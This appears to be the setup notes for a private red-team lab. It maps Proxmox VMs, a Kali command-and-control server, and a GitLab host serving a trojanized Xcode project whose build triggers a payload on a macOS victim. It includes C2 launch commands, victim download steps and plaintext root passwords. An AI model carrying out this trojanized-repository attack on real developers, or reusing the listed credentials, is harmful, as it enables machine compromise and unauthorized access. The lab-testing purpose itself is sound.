# Red Team Lab Configuration

## Infrastructure Map

```
┌─────────────────────────────────────────────────────────────────────┐
│                    PROXMOX 1: 192.168.36.237                        │
├─────────────────────────────────────────────────────────────────────┤
│  VM 200: macOS Sonoma (Target)                                      │
│          Status: Installing                                          │
│          Role: Victim developer machine                              │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│                    PROXMOX 2: 192.168.36.225                        │
├─────────────────────────────────────────────────────────────────────┤
│  VM 202: kali-c2         │ 192.168.36.172  │ Kali Linux            │
│          Creds: kali:kali │                 │ Red Team C2 Server    │
├─────────────────────────────────────────────────────────────────────┤
│  VM 203: adaptix-c2      │ 192.168.36.226  │ Adaptix C2 Framework  │
│          Creds: ?         │                 │ Alternative C2        │
├─────────────────────────────────────────────────────────────────────┤
│  VM 210: gitlab-ce       │ 192.168.36.252  │ GitLab Server         │
│          Creds: ?         │                 │ Malicious Repo Host   │
└─────────────────────────────────────────────────────────────────────┘
```

## Attack Flow

```
                    ┌──────────────────┐
                    │   GitLab         │
                    │ 192.168.36.252   │
                    │                  │
                    │ Hosts malicious  │
                    │ Xcode project    │
                    └────────┬─────────┘
                             │
                    1. Clone/Download
                             │
                             ▼
┌──────────────────┐    ┌──────────────────┐
│   Kali C2        │◄───│   macOS Target   │
│ 192.168.36.172   │    │   VM 200         │
│                  │    │                  │
│ Receives beacons │    │ Opens project    │
│ Sends payloads   │    │ Builds in Xcode  │
│ Port 8888        │    │ Executes payload │
└──────────────────┘    └──────────────────┘
```

## Quick Deploy Commands

### On Kali C2 (192.168.36.172)

```bash
# SSH into Kali
ssh kali@192.168.36.172  # password: kali

# Install dependencies
sudo apt update && sudo apt install -y python3-pip python3-venv

# Create demo directory
mkdir -p ~/red_team_demo && cd ~/red_team_demo

# (Transfer files from this repo or git clone)

# Setup and run C2
cd ~/red_team_demo/scripts
./setup.sh

# Start C2 Server (listen on all interfaces)
source ../.venv/bin/activate
python3 ../c2_server/c2_server.py --host 0.0.0.0 --port 8888

# Start Gitea Simulator (optional - can use real GitLab instead)
python3 ../gitea_server/gitea_simulator.py --host 0.0.0.0 --port 8080 --c2 http://192.168.36.172:8888
```

### On GitLab (192.168.36.252)

1. Create repository: `malicious-xcode-project`
2. Upload trojanized Xcode project
3. Victim clones from: `http://192.168.36.252/<user>/malicious-xcode-project.git`

### On macOS Target (VM 200)

```bash
# Clone malicious repo from GitLab
git clone http://192.168.36.252/<user>/malicious-xcode-project.git

# Or download from Gitea simulator
curl -O http://192.168.36.172:8080/jargal.karlsen/starter-project/archive/main.zip
unzip main.zip

# Open in Xcode and build
open MarkdownEditor.xcodeproj
# Press Cmd+B to build -> triggers payload
```

## Configuration Values

| Variable | Value |
|----------|-------|
| C2_SERVER | http://192.168.36.172:8888 |
| GITEA_SERVER | http://192.168.36.172:8080 |
| GITLAB_SERVER | http://192.168.36.252 |
| MACOS_TARGET | VM 200 (IP TBD after install) |

## Credentials

| System | Username | Password |
|--------|----------|----------|
| Proxmox 1 (237) | root | lahilabs2018 |
| Proxmox 2 (225) | root | lahilabs2018 |
| Kali C2 (202) | kali | kali |
| GitLab (210) | ? | ? |
| macOS (200) | ? | ? |
